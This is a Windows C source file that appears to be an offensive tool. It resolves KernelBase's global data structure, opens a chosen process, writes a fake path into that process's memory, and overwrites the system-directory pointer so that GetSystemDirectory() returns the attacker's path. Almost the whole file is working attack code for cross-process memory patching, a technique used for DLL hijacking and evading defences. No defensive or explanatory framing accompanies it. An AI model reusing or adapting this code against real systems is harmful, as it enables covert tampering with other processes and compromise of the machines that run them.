#include "kbgd.h"
#include <stdio.h>

PVOID ResolveKBGD(void) {
    HMODULE hKernelBase = LoadLibraryW(L"KernelBase.dll");
    if (!hKernelBase) {
        printf("[-] Failed to load KernelBase.dll (Error: %lu)\n", GetLastError());
        return NULL;
    }

    LPFN_KernelBaseGetGlobalData pGetGlobalData =
        (LPFN_KernelBaseGetGlobalData)GetProcAddress(hKernelBase, "KernelBaseGetGlobalData");

    if (!pGetGlobalData) {
        printf("[-] Failed to resolve KernelBaseGetGlobalData export (Error: %lu)\n", GetLastError());
        FreeLibrary(hKernelBase);
        return NULL;
    }

    PVOID pGlobalData = pGetGlobalData();
    printf("[+] KBGD address: 0x%p\n", pGlobalData);

    FreeLibrary(hKernelBase);
    return pGlobalData;
}

BOOL PatchKBGD(DWORD targetPid, const WCHAR* fakePath) {
    BOOL success = FALSE;
    HANDLE hProcess = NULL;
    PVOID allocatedBuffer = NULL;

    // Step 1: Resolve KBGD address
    printf("[*] Resolving KBGD address...\n");
    PVOID pGlobalData = ResolveKBGD();
    if (!pGlobalData) {
        return FALSE;
    }

    // Step 2: Open target process
    printf("[*] Opening target process (PID: %lu)...\n", targetPid);
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Failed to open process (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    // Step 3: Allocate and write fake path in target process
    printf("[*] Allocating fake path buffer in target...\n");
    SIZE_T fakePathSize = (wcslen(fakePath) + 1) * sizeof(WCHAR);
    allocatedBuffer = VirtualAllocEx(hProcess, NULL, fakePathSize,
                                     MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!allocatedBuffer) {
        printf("[-] VirtualAllocEx failed (Error: %lu)\n", GetLastError());
        goto cleanup;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, allocatedBuffer, fakePath, fakePathSize, &bytesWritten)) {
        printf("[-] Failed to write fake path (Error: %lu)\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Fake path written to 0x%p\n", allocatedBuffer);

    // Step 4: Overwrite KBGD+32 to point at our fake path
    printf("[*] Patching KBGD system directory pointer...\n");
    PVOID pSystemDirPointer = (PBYTE)pGlobalData + KBGD_SYSTEM_DIRECTORY_OFFSET;

    bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pSystemDirPointer, &allocatedBuffer,
                           sizeof(PVOID), &bytesWritten)) {
        printf("[-] Failed to patch KBGD (Error: %lu)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully patched KBGD+%d\n", KBGD_SYSTEM_DIRECTORY_OFFSET);
    printf("[+] GetSystemDirectory() will now return: %ws\n", fakePath);
    success = TRUE;

cleanup:
    if (hProcess) CloseHandle(hProcess);
    return success;
}
